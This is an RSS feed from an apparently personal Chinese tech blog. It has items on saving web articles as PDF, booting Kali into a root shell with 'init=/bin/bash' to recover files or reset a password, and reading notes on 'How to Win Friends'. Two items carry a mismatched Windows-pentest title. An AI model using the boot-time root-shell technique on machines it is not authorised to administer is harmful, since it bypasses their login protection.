<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>sqrt7</title>
        <link>https://w-sqrt7.github.io</link>
        <description></description>
        <language>zh-CN</language>
        <pubDate>Sat, 23 Nov 2024 11:29:39 +0800</pubDate>
        <lastBuildDate>Sat, 23 Nov 2024 11:29:39 +0800</lastBuildDate>
        <category>原创</category>
        <category>逆向</category>
        <category>C语言</category>
        <category>misc</category>
        <category>汇编</category>
        <category>web</category>
        <category>网基</category>
        <category>eNSP</category>
        <category>转载</category>
        <category>信息安全</category>
        <category>渗透</category>
        <category>哲学</category>
        <category>工具</category>
        <category>基础</category>
        <category>kali</category>
        <category>靶场</category>
        <category>vulhub</category>
        <category>xss-labs</category>
        <item>
            <guid isPermalink="true">https://w-sqrt7.github.io/2024/11/23/other/basic/%E4%BA%92%E8%81%94%E7%BD%91%E6%96%87%E7%AB%A0%E4%B8%8B%E8%BD%BD/</guid>
            <title>Windows渗透测试中常用命令</title>
            <link>https://w-sqrt7.github.io/2024/11/23/other/basic/%E4%BA%92%E8%81%94%E7%BD%91%E6%96%87%E7%AB%A0%E4%B8%8B%E8%BD%BD/</link>
            <category>转载</category>
            <category>基础</category>
            <pubDate>Sat, 23 Nov 2024 11:29:39 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;互联网文章下载&#34;&gt;&lt;a href=&#34;#互联网文章下载&#34; class=&#34;headerlink&#34; title=&#34;互联网文章下载&#34;&gt;&lt;/a&gt;互联网文章下载&lt;/h1&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;在互联网上，总会有些技术文章等，让人看得眼前一亮，想要扒下来存着，方便以后使用，但是苦恼于一直无法获取源文件，所以最开始，在我啥都不懂的时候，dump文章基本上都是靠ctrl+c和ctrl+v来操作的，但是弄下来之后排版问题基本上可以说的上是惨不忍睹，这又要自己花费大量的时间去修改整理，总之很费劲，但到了如今，对计算机的使用也是越发的熟练，也就准备写一份这样的文章，记录一下，同时纪念一下曾经那个有些蠢笨的自己。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h2 id=&#34;1-普通站点文章&#34;&gt;&lt;a href=&#34;#1-普通站点文章&#34; class=&#34;headerlink&#34; title=&#34;1.普通站点文章&#34;&gt;&lt;/a&gt;1.普通站点文章&lt;/h2&gt;&lt;p&gt;大部分网站还是比较好操作的，直接ctrl+p或浏览器右上角进行页面打印就可以，打印为pdf文件，后续在利用格式工厂或其他工具转为其他格式，看个人需求。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/11/23/other/basic/%E4%BA%92%E8%81%94%E7%BD%91%E6%96%87%E7%AB%A0%E4%B8%8B%E8%BD%BD/image-20241123114111667.png&#34; alt=&#34;image-20241123114111667&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/11/23/other/basic/%E4%BA%92%E8%81%94%E7%BD%91%E6%96%87%E7%AB%A0%E4%B8%8B%E8%BD%BD/image-20241123113928907.png&#34; alt=&#34;image-20241123113928907&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;2-CSDN博客文章&#34;&gt;&lt;a href=&#34;#2-CSDN博客文章&#34; class=&#34;headerlink&#34; title=&#34;2.CSDN博客文章&#34;&gt;&lt;/a&gt;2.CSDN博客文章&lt;/h2&gt;&lt;p&gt;在CSDN上面下载文章相对麻烦一些，首先打开控制台，输入给出的代码并回车，然后会自动弹出打印窗口，有的时候会出现卡边的情况，这里要根据实际情况，修改一下纵横方向，纸张大小，缩放比例等。&lt;/p&gt;
&lt;p&gt;当然也有一些个人博客等比较麻烦的，根据实际情况修改代码或其他设置即可。&lt;/p&gt;
&lt;figure class=&#34;highlight js&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;(&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $(&lt;span class=&#34;string&#34;&gt;&amp;quot;#side&amp;quot;&lt;/span&gt;).&lt;span class=&#34;title function_&#34;&gt;remove&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $(&lt;span class=&#34;string&#34;&gt;&amp;quot;#comment_title, #comment_list, #comment_bar, #comment_form, .announce, #ad_cen, #ad_bot&amp;quot;&lt;/span&gt;).&lt;span class=&#34;title function_&#34;&gt;remove&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $(&lt;span class=&#34;string&#34;&gt;&amp;quot;.nav_top_2011, #header, #navigator&amp;quot;&lt;/span&gt;).&lt;span class=&#34;title function_&#34;&gt;remove&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $(&lt;span class=&#34;string&#34;&gt;&amp;quot;.p4course_target, .comment-box, .recommend-box, #csdn-toolbar, #tool-box&amp;quot;&lt;/span&gt;).&lt;span class=&#34;title function_&#34;&gt;remove&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $(&lt;span class=&#34;string&#34;&gt;&amp;quot;aside&amp;quot;&lt;/span&gt;).&lt;span class=&#34;title function_&#34;&gt;remove&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $(&lt;span class=&#34;string&#34;&gt;&amp;quot;.tool-box&amp;quot;&lt;/span&gt;).&lt;span class=&#34;title function_&#34;&gt;remove&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $(&lt;span class=&#34;string&#34;&gt;&amp;quot;#toolBarBox&amp;quot;&lt;/span&gt;).&lt;span class=&#34;title function_&#34;&gt;remove&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $(&lt;span class=&#34;string&#34;&gt;&amp;quot;main&amp;quot;&lt;/span&gt;).&lt;span class=&#34;title function_&#34;&gt;css&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;display&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;content&amp;#x27;&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $(&lt;span class=&#34;string&#34;&gt;&amp;quot;main&amp;quot;&lt;/span&gt;).&lt;span class=&#34;title function_&#34;&gt;css&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;float&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;left&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $(&lt;span class=&#34;string&#34;&gt;&amp;quot;.option-box&amp;quot;&lt;/span&gt;).&lt;span class=&#34;title function_&#34;&gt;remove&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $(&lt;span class=&#34;string&#34;&gt;&amp;quot;body&amp;quot;&lt;/span&gt;).&lt;span class=&#34;title function_&#34;&gt;css&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;min-width&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $(&lt;span class=&#34;string&#34;&gt;&amp;quot;.option-box&amp;quot;&lt;/span&gt;).&lt;span class=&#34;title function_&#34;&gt;remove&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;variable language_&#34;&gt;window&lt;/span&gt;.&lt;span class=&#34;title function_&#34;&gt;print&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;)();&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/11/23/other/basic/%E4%BA%92%E8%81%94%E7%BD%91%E6%96%87%E7%AB%A0%E4%B8%8B%E8%BD%BD/image-20241123115204137.png&#34; alt=&#34;image-20241123115204137&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/11/23/other/basic/%E4%BA%92%E8%81%94%E7%BD%91%E6%96%87%E7%AB%A0%E4%B8%8B%E8%BD%BD/image-20241123115138233.png&#34; alt=&#34;image-20241123115138233&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;3-微信公众号文章&#34;&gt;&lt;a href=&#34;#3-微信公众号文章&#34; class=&#34;headerlink&#34; title=&#34;3.微信公众号文章&#34;&gt;&lt;/a&gt;3.微信公众号文章&lt;/h2&gt;&lt;p&gt;打开公众号文章，想方设法用浏览器打开，然后就是直接页面打印就行了&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/11/23/other/basic/%E4%BA%92%E8%81%94%E7%BD%91%E6%96%87%E7%AB%A0%E4%B8%8B%E8%BD%BD/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-11-23%20115654.png&#34; alt=&#34;屏幕截图 2024-11-23 115654&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/11/23/other/basic/%E4%BA%92%E8%81%94%E7%BD%91%E6%96%87%E7%AB%A0%E4%B8%8B%E8%BD%BD/image-20241123115920720.png&#34; alt=&#34;image-20241123115920720&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/11/23/other/basic/%E4%BA%92%E8%81%94%E7%BD%91%E6%96%87%E7%AB%A0%E4%B8%8B%E8%BD%BD/image-20241123120008767.png&#34; alt=&#34;image-20241123120008767&#34;&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://w-sqrt7.github.io/2024/09/21/other/basic/kali%E4%BD%BF%E7%94%A8%E5%8D%95%E7%94%A8%E6%88%B7%E6%A8%A1%E5%BC%8F/</guid>
            <title>Windows渗透测试中常用命令</title>
            <link>https://w-sqrt7.github.io/2024/09/21/other/basic/kali%E4%BD%BF%E7%94%A8%E5%8D%95%E7%94%A8%E6%88%B7%E6%A8%A1%E5%BC%8F/</link>
            <category>转载</category>
            <category>基础</category>
            <pubDate>Sat, 21 Sep 2024 19:40:45 +0800</pubDate>
            <description><![CDATA[ &lt;h3 id=&#34;使用单用户模式&#34;&gt;&lt;a href=&#34;#使用单用户模式&#34; class=&#34;headerlink&#34; title=&#34;使用单用户模式&#34;&gt;&lt;/a&gt;使用单用户模式&lt;/h3&gt;&lt;p&gt;如果你可以以单用户模式登录，可以尝试从单用户模式恢复文件。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;重启系统&lt;/strong&gt;： 重启你的计算机。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;进入 GRUB 菜单&lt;/strong&gt;： 在启动过程中，当GRUB菜单出现时，选择 “Advanced options for Kali Linux”。在启动过程中，当GRUB（GRand Unified Bootloader）菜单出现时，选择你通常启动的Kali Linux内核条目，但不要按回车键进入。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;编辑启动选项&lt;/strong&gt;： 在高亮显示的内核条目上，按&lt;code&gt;e&lt;/code&gt;键编辑启动选项。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;修改内核启动行&lt;/strong&gt;： 使用上下箭头键找到以&lt;code&gt;linux&lt;/code&gt;开头的那一行。在这一行的末尾，添加以下参数：&lt;/p&gt;
&lt;figure class=&#34;highlight text&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;init=/bin/bash&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;确保不要添加任何前缀空格，但要在现有的&lt;code&gt;ro&lt;/code&gt;或其他参数后添加一个空格，然后再添加&lt;code&gt;init=/bin/bash&lt;/code&gt;。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;进入单用户模式&lt;/strong&gt;： 完成上述配置后按下&lt;code&gt;ctrl + X&lt;/code&gt;或&lt;code&gt;F10&lt;/code&gt;启动系统系统将启动到一个单用户模式的root shell。，。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;挂载文件系统为读写模式&lt;/strong&gt;： 在单用户模式下，文件系统默认是只读的，需要重新挂载为读写模式：&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;mount -o remount,rw /&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;恢复原始文件或重置密码&lt;/strong&gt;： 使用Live CD&amp;#x2F;USB或其他方式获取原始文件，并替换更改的文件。你可以使用 &lt;code&gt;cp&lt;/code&gt; 命令从Live环境复制文件到系统中。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;strong&gt;重启系统&lt;/strong&gt;： 执行 &lt;code&gt;reboot -f&lt;/code&gt; 命令重启系统。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;检查文件系统状态&#34;&gt;&lt;a href=&#34;#检查文件系统状态&#34; class=&#34;headerlink&#34; title=&#34;检查文件系统状态&#34;&gt;&lt;/a&gt;检查文件系统状态&lt;/h3&gt;&lt;p&gt;首先，你需要检查文件系统的状态。运行以下命令来查看文件系统的挂载状态：&lt;/p&gt;
&lt;p&gt;bash&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;mount | grep &lt;span class=&#34;string&#34;&gt;&amp;quot; on / &amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;重新挂载文件系统为读写模式&#34;&gt;&lt;a href=&#34;#重新挂载文件系统为读写模式&#34; class=&#34;headerlink&#34; title=&#34;重新挂载文件系统为读写模式&#34;&gt;&lt;/a&gt;重新挂载文件系统为读写模式&lt;/h3&gt;&lt;p&gt;如果文件系统被挂载为只读，你可以尝试重新挂载为读写模式。使用以下命令：&lt;/p&gt;
&lt;p&gt;bash&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo mount -o remount,rw /&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;这条命令会尝试重新挂载根文件系统为读写模式。如果成功，你可以再次尝试更改权限。&lt;/p&gt;
&lt;h3 id=&#34;检查文件系统错误&#34;&gt;&lt;a href=&#34;#检查文件系统错误&#34; class=&#34;headerlink&#34; title=&#34;检查文件系统错误&#34;&gt;&lt;/a&gt;检查文件系统错误&lt;/h3&gt;&lt;p&gt;如果文件系统被挂载为只读，可能是因为有未处理的错误。运行文件系统检查：&lt;/p&gt;
&lt;p&gt;bash复制&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;sudo fsck -f /&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt; ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://w-sqrt7.github.io/2024/07/20/philosophy/%E4%BA%BA%E6%80%A7%E7%9A%84%E5%BC%B1%E7%82%B9/</guid>
            <title></title>
            <link>https://w-sqrt7.github.io/2024/07/20/philosophy/%E4%BA%BA%E6%80%A7%E7%9A%84%E5%BC%B1%E7%82%B9/</link>
            <pubDate>Sat, 20 Jul 2024 22:15:26 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;人性的弱点&#34;&gt;&lt;a href=&#34;#人性的弱点&#34; class=&#34;headerlink&#34; title=&#34;人性的弱点&#34;&gt;&lt;/a&gt;人性的弱点&lt;/h1&gt;&lt;h2 id=&#34;1-与人相处的基本技巧&#34;&gt;&lt;a href=&#34;#1-与人相处的基本技巧&#34; class=&#34;headerlink&#34; title=&#34;1.与人相处的基本技巧&#34;&gt;&lt;/a&gt;1.与人相处的基本技巧&lt;/h2&gt;&lt;h3 id=&#34;永远不要批评斥责抱怨他人&#34;&gt;&lt;a href=&#34;#永远不要批评斥责抱怨他人&#34; class=&#34;headerlink&#34; title=&#34;永远不要批评斥责抱怨他人&#34;&gt;&lt;/a&gt;永远不要批评斥责抱怨他人&lt;/h3&gt;&lt;p&gt;无论一个人犯了何种错误，第一反应永远不会是自责&lt;/p&gt;
&lt;p&gt;批评斥责只会伤害其自尊，引起强烈的反抗&lt;/p&gt;
&lt;p&gt;人类的天性，只会责怪别人，不会责怪自己，每个人都是如此&lt;/p&gt;
&lt;p&gt;批评他人很容易给自己引来麻烦&lt;/p&gt;
&lt;h3 id=&#34;真诚的赞美他人&#34;&gt;&lt;a href=&#34;#真诚的赞美他人&#34; class=&#34;headerlink&#34; title=&#34;真诚的赞美他人&#34;&gt;&lt;/a&gt;真诚的赞美他人&lt;/h3&gt;&lt;p&gt;若希望一个人按照你的要求做事，最好的方法就是满足他的需求&lt;/p&gt;
&lt;p&gt;对任何人来讲，赞美都比批评更有效，更容易激发对方的热情&lt;/p&gt;
&lt;p&gt;所有人都喜欢别人恭维自己，在人类的天性中，最深层的本质就是渴望得到别人的重视和关注&lt;/p&gt;
&lt;p&gt;赞美不同于谄媚，谄媚如假钞，赞美如甘露，基于真诚的赞美&lt;/p&gt;
&lt;p&gt;发现别人的优点真诚的赞美他人&lt;/p&gt;
&lt;h3 id=&#34;激发他人的强烈需求&#34;&gt;&lt;a href=&#34;#激发他人的强烈需求&#34; class=&#34;headerlink&#34; title=&#34;激发他人的强烈需求&#34;&gt;&lt;/a&gt;激发他人的强烈需求&lt;/h3&gt;&lt;p&gt;唯一能够影响他人的方法就是讨论他的需求，然后告诉他如何才能满足这种需求&lt;/p&gt;
&lt;p&gt;掌握对方迫切的需求便能如鱼得水，事半功倍&lt;/p&gt;
&lt;p&gt;钓人如钓鱼，要投其所好，挂上鱼儿喜欢吃的东西&lt;/p&gt;
&lt;p&gt;每个人都值关心自己的需求，对他人的需求并不感兴趣，讨论他的需求，然后告诉他如何才能满足这种需求&lt;/p&gt;
&lt;p&gt;站在对方的立场考虑问题，抓住对方的需求&lt;/p&gt;
&lt;h2 id=&#34;2-如何让他人喜欢你&#34;&gt;&lt;a href=&#34;#2-如何让他人喜欢你&#34; class=&#34;headerlink&#34; title=&#34;2.如何让他人喜欢你&#34;&gt;&lt;/a&gt;2.如何让他人喜欢你&lt;/h2&gt;&lt;h3 id=&#34;真诚的关心&#34;&gt;&lt;a href=&#34;#真诚的关心&#34; class=&#34;headerlink&#34; title=&#34;真诚的关心&#34;&gt;&lt;/a&gt;真诚的关心&lt;/h3&gt;&lt;p&gt;一个人通过真诚测关心他人，即便是最忙碌的著名人士，依然能够占用他们的时间，获得与他们合作的机会&lt;/p&gt;
&lt;p&gt;无论是知名人士还是普通人，大家都喜欢尊重自己的人&lt;/p&gt;
&lt;h3 id=&#34;微笑待人&#34;&gt;&lt;a href=&#34;#微笑待人&#34; class=&#34;headerlink&#34; title=&#34;微笑待人&#34;&gt;&lt;/a&gt;微笑待人&lt;/h3&gt;&lt;p&gt;人际交往中，真正发自内心的微笑有着很重要的作用&lt;/p&gt;
&lt;p&gt;爱微笑的人往往比不爱微笑的人更受欢迎&lt;/p&gt;
&lt;h3 id=&#34;记住他人的名字&#34;&gt;&lt;a href=&#34;#记住他人的名字&#34; class=&#34;headerlink&#34; title=&#34;记住他人的名字&#34;&gt;&lt;/a&gt;记住他人的名字&lt;/h3&gt;&lt;p&gt;每个人都很重视自己的名字，所以记住别人的名字，是一种礼貌，不仅能获得别人的好感，还能让你有意想不到的收获&lt;/p&gt;
&lt;p&gt;无论在商业中还是政治中，牢记他人的名字都是很重要的事情&lt;/p&gt;
&lt;p&gt;牢牢记住所接触的每一个人的名字&lt;/p&gt;
&lt;h3 id=&#34;善于倾听他人讲话&#34;&gt;&lt;a href=&#34;#善于倾听他人讲话&#34; class=&#34;headerlink&#34; title=&#34;善于倾听他人讲话&#34;&gt;&lt;/a&gt;善于倾听他人讲话&lt;/h3&gt;&lt;p&gt;如果想要获得别人的好感，善于倾听对方讲话时很重要的事情，这是对他的最高恭维&lt;/p&gt;
&lt;p&gt;不认真听别人讲话，而是不断谈论自己的事情，只会让别人厌恶你，轻视你&lt;/p&gt;
&lt;p&gt;不要打断别人的话，注意听对方说话的重点，适当发表自己的意见，关注他人的需求，忽略自己的感受与&lt;/p&gt;
&lt;h3 id=&#34;谈论他人的兴趣&#34;&gt;&lt;a href=&#34;#谈论他人的兴趣&#34; class=&#34;headerlink&#34; title=&#34;谈论他人的兴趣&#34;&gt;&lt;/a&gt;谈论他人的兴趣&lt;/h3&gt;&lt;p&gt;最容易接近别人心灵的方法就是谈论他人感兴趣的话题，这可以让自己成为一个深受欢迎的人&lt;/p&gt;
&lt;p&gt;拓宽自己的知识面，增加自己与他人谈论的接触面&lt;/p&gt;
&lt;p&gt;谈论对方感兴趣的话题，要适当发表自己的意见，保证自己说出的信息是准确的&lt;/p&gt;
&lt;p&gt;不要刻意的讨论对方感兴趣的事情，而是在无意间提起，如果刻意，只会引起反效果&lt;/p&gt;
&lt;p&gt;真诚的表现出自己的兴趣，对于有用的人，越是值得接近的人，越努力的研究他人的兴趣，并牢记这些知识，以便深入交谈&lt;/p&gt;
&lt;h3 id=&#34;满足他人的自重感&#34;&gt;&lt;a href=&#34;#满足他人的自重感&#34; class=&#34;headerlink&#34; title=&#34;满足他人的自重感&#34;&gt;&lt;/a&gt;满足他人的自重感&lt;/h3&gt;&lt;p&gt;人际交往中的重要法则，尊重别人，让对方获得自重感&lt;/p&gt;
&lt;p&gt;人类最深层的欲望就是得到别人的重视&lt;/p&gt;
&lt;p&gt;己所不欲勿施于人，己所欲者亦施于人&lt;/p&gt;
&lt;h2 id=&#34;3-如何赢得他人的赞同&#34;&gt;&lt;a href=&#34;#3-如何赢得他人的赞同&#34; class=&#34;headerlink&#34; title=&#34;3.如何赢得他人的赞同&#34;&gt;&lt;/a&gt;3.如何赢得他人的赞同&lt;/h2&gt;&lt;h3 id=&#34;不要与他人争论&#34;&gt;&lt;a href=&#34;#不要与他人争论&#34; class=&#34;headerlink&#34; title=&#34;不要与他人争论&#34;&gt;&lt;/a&gt;不要与他人争论&lt;/h3&gt;&lt;p&gt;喜欢和别人争论，反驳别人的观点，可能赢得一时的胜利，但这毫无价值，永远无法获得对方的好感&lt;/p&gt;
&lt;p&gt;避免争论往往能获得最大的胜利&lt;/p&gt;
&lt;h3 id=&#34;永远不要指责他人的错误&#34;&gt;&lt;a href=&#34;#永远不要指责他人的错误&#34; class=&#34;headerlink&#34; title=&#34;永远不要指责他人的错误&#34;&gt;&lt;/a&gt;永远不要指责他人的错误&lt;/h3&gt;&lt;p&gt;即便你比他人聪明，也绝对不能告诉对方你比他聪明&lt;/p&gt;
&lt;p&gt;承认自己的错误之处，不仅能避免争论，还能让对方同样“大度”&lt;/p&gt;
&lt;p&gt;即便你指出别人的错误，对方也不一定会认同你，同时还会引起对方的反抗，即便与他辩论，讲道理，依旧无法改变他的观点，因为你对他的自尊造成了伤害&lt;/p&gt;
&lt;h3 id=&#34;用于承认自己的错误&#34;&gt;&lt;a href=&#34;#用于承认自己的错误&#34; class=&#34;headerlink&#34; title=&#34;用于承认自己的错误&#34;&gt;&lt;/a&gt;用于承认自己的错误&lt;/h3&gt;&lt;p&gt;承认自己可能的错误，能够避免与人争论，还有利于解决问题，更容易达到目的&lt;/p&gt;
&lt;p&gt;如果你是对的，使用相对温和的语气让对方赞同你的观点，使用巧妙的方式让别人赞同我们的观点&lt;/p&gt;
&lt;h3 id=&#34;善待他人&#34;&gt;&lt;a href=&#34;#善待他人&#34; class=&#34;headerlink&#34; title=&#34;善待他人&#34;&gt;&lt;/a&gt;善待他人&lt;/h3&gt;&lt;p&gt;每个人都有自己的想法，且很难强迫他们改变自己的想法来赞同你的观点&lt;/p&gt;
&lt;p&gt;如果想让别人赞同你的观点，就需要友善的对待他，让他相信你真正的将他当作朋友&lt;/p&gt;
&lt;p&gt;友善待人，用温和的态度赢得别人的心&lt;/p&gt;
&lt;h3 id=&#34;站在对方的立场思考问题&#34;&gt;&lt;a href=&#34;#站在对方的立场思考问题&#34; class=&#34;headerlink&#34; title=&#34;站在对方的立场思考问题&#34;&gt;&lt;/a&gt;站在对方的立场思考问题&lt;/h3&gt;&lt;p&gt;在与人交往时，不要将自己的观点强加给别人，而是从对方的立场思考问题&lt;/p&gt;
&lt;p&gt;只有从别人的角度看问题，了解对方的思想，才能在为人处世中创造奇迹，获得对方好感&lt;/p&gt;
&lt;p&gt;不要牢记别人的错误，不要轻易的职责别人，只有傻子才会那样做&lt;/p&gt;
&lt;p&gt;对方的所言所行有他自己的道理，如果能找到那个原因，便掌握了理解他们的钥匙&lt;/p&gt;
&lt;p&gt;尝试思考：如果我是他，我会有什么感受，又会做出何种反应&lt;/p&gt;
&lt;p&gt;站在对方的角度思考，有什么理由能够让他这样做&lt;/p&gt;
&lt;h3 id=&#34;充分理解他人的感受&#34;&gt;&lt;a href=&#34;#充分理解他人的感受&#34; class=&#34;headerlink&#34; title=&#34;充分理解他人的感受&#34;&gt;&lt;/a&gt;充分理解他人的感受&lt;/h3&gt;&lt;p&gt;有一句神奇的话：我一点也不奇怪你有那样的感受，如果我是你的话，我的感受也是一样的&lt;/p&gt;
&lt;p&gt;在消除他人的恶感时，感同身受有着很重要的作用&lt;/p&gt;
&lt;p&gt;相互理解时困难的，不能理解才是正常的&lt;/p&gt;
